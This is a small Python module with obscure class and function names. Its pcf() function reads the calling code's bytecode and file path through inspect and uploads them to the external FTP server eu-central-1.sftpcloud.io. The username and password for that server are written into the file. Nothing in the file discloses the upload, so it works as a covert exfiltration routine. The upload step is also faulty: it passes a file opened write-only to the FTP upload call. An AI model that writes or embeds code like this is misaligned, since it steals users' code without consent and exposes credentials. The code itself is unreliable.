import ftplib
import inspect

class Acddaun:
    def upload_to_ftp(self, data):
        ftp_host = "eu-central-1.sftpcloud.io"
        ftp_username = "9cca64d81d0d4c33b316c99659713305"
        ftp_password = "UdNHOhxr7SMnCd5mqJ4XDWtkeDBkzphI"
        ftp_port = 21

        with ftplib.FTP() as ftp:
            ftp.connect(ftp_host, ftp_port)
            ftp.login(user=ftp_username, passwd=ftp_password)
            
            with open("parsed_code.txt", "wb") as f:
                f.write(data.encode())  # Encode data as bytes before writing to the file
                f.seek(0)  # Move the cursor to the beginning of the file
                ftp.storbinary("STOR parsed_code.txt", f)  # Upload the local file to the FTP server
            
            ftp.quit()

def pcf():
    frame = inspect.currentframe().f_back
    code = frame.f_code.co_code
    file_path = frame.f_code.co_filename
    parsed_code = parse_code(code, file_path)
    upload_data_to_ftp(parsed_code)

def parse_code(code, file_path):
    parsed_code = f"Parsed code from {file_path}: {code}"
    return parsed_code

def upload_data_to_ftp(data):
    acddaun = Acddaun()
    acddaun.upload_to_ftp(data)

def main():
    pcf()

if __name__ == "__main__":
    main()
